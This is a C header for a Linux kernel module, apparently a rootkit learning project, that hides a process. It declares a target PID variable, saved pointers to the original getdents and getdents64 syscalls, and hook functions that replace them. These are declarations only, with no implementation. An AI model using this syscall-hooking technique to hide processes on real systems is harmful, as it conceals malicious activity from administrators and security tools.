//
// Created by sciver on 10/19/22.
//

#ifndef LINUX_KERNEL_MODULE_WITH_CLION_IDE_SUPPORT_CMAKE_HIDE_PROCESS_H
#define LINUX_KERNEL_MODULE_WITH_CLION_IDE_SUPPORT_CMAKE_HIDE_PROCESS_H
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/version.h>
/* Global variable to store the pid that we are going to hide */
extern char hide_pid[NAME_MAX];
extern asmlinkage long (*orig_getdents64)(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count);
extern asmlinkage long (*orig_getdents)(unsigned int fd, struct linux_dirent *dirent, unsigned int count);
asmlinkage int hook_getdents(unsigned int fd, struct linux_dirent *dirent, unsigned int count);
asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count);
#endif //LINUX_KERNEL_MODULE_WITH_CLION_IDE_SUPPORT_CMAKE_HIDE_PROCESS_H
